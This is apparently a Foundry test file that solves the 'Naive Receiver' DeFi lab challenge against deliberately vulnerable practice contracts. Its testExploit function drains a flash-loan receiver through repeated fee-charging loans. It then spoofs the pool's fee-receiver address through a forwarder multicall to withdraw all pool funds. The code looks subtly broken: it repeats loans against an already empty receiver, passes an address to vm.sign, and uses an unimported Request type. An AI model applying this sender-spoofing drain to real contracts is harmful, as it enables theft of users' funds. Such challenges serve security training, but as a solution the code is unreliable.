// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";
import "forge-std/console2.sol";

import {FlashLoanReceiver} from "../../../src/Contracts/naive-receiver/FlashLoanReceiver.sol";
import {NaiveReceiverPool} from "../../../src/Contracts/naive-receiver/NaiveReceiverPool.sol";
import {BasicForwarder} from "../../../src/Contracts/naive-receiver/BasicForwarder.sol";
import {WETH} from "solmate/tokens/WETH.sol";

contract NaiveReceiver is Test {
    uint256 internal constant WETH_IN_POOL = 1_000e18;
    uint256 internal constant WETH_IN_RECEIVER = 10e18;

    Utilities internal utils;
    NaiveReceiverPool internal pool;
    FlashLoanReceiver internal flashLoanReceiver;
    BasicForwarder internal forwarder;
    WETH internal weth;
    address internal feeReceiver;

    address payable internal user;
    address payable internal attacker;

    address internal recovery;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(2);
        user = users[0];
        attacker = users[1];

        vm.label(user, "User");
        vm.label(attacker, "Attacker");

        forwarder = new BasicForwarder();
        weth = new WETH();
        feeReceiver = address(0xfee);
        recovery = address(0x1234);

        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(address(weth)), feeReceiver);
        vm.label(address(pool), "Naive Receiver Pool");

        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1e18);

        flashLoanReceiver = new FlashLoanReceiver(address(pool));
        vm.label(address(flashLoanReceiver), "Flash Loan Receiver");

        vm.deal(user, WETH_IN_RECEIVER);
        vm.prank(user);
        weth.deposit{value: WETH_IN_RECEIVER}();
        vm.prank(user);
        weth.transfer(address(flashLoanReceiver), WETH_IN_RECEIVER);

        assertEq(weth.balanceOf(address(flashLoanReceiver)), WETH_IN_RECEIVER);

        console2.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */

        vm.startPrank(attacker);
        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(flashLoanReceiver, address(weth), 0, "");
        }

        address admin = pool.feeReceiver(); // store the address of the the feeReceiver
        bytes[] memory data = new bytes[](11); // 10 calls to pool.flashLoan + 1 call to pool.withdraw

        // Build the data for the 10 calls to pool.flashLoan
        for (uint256 i = 0; i < 10; i++) {
            data[i] = abi.encodeCall(pool.flashLoan, (flashLoanReceiver, address(weth), 0, ""));
        }

        // Build the data for the 1 call to pool.withdraw, append the admin address to the data
        data[10] = abi.encodePacked(abi.encodeCall(pool.withdraw, (WETH_IN_POOL, recovery)), admin);

        bytes memory payload = abi.encodeCall(pool.multicall, data);

        Request request = Request({
            from: attacker,
            target: address(pool),
            value: 0,
            gas: 10000000,
            nonce: 0,
            data: payload,
            deadline: block.timestamp + 1000
        });

        bytes32 digest =
            keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request)));

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(attacker, digest);
        bytes memory signature = abi.encodePacked(r, s, v);

        forwarder.execute(request, signature);

        vm.stopPrank();

        /**
         * EXPLOIT END *
         */
        validation();
        console2.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        // All WETH has been drained from the receiver
        assertEq(weth.balanceOf(address(flashLoanReceiver)), 0);
        // All WETH has been drained from the pool
        assertEq(weth.balanceOf(address(pool)), 0);
        // All WETH is in the recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER);
    }
}
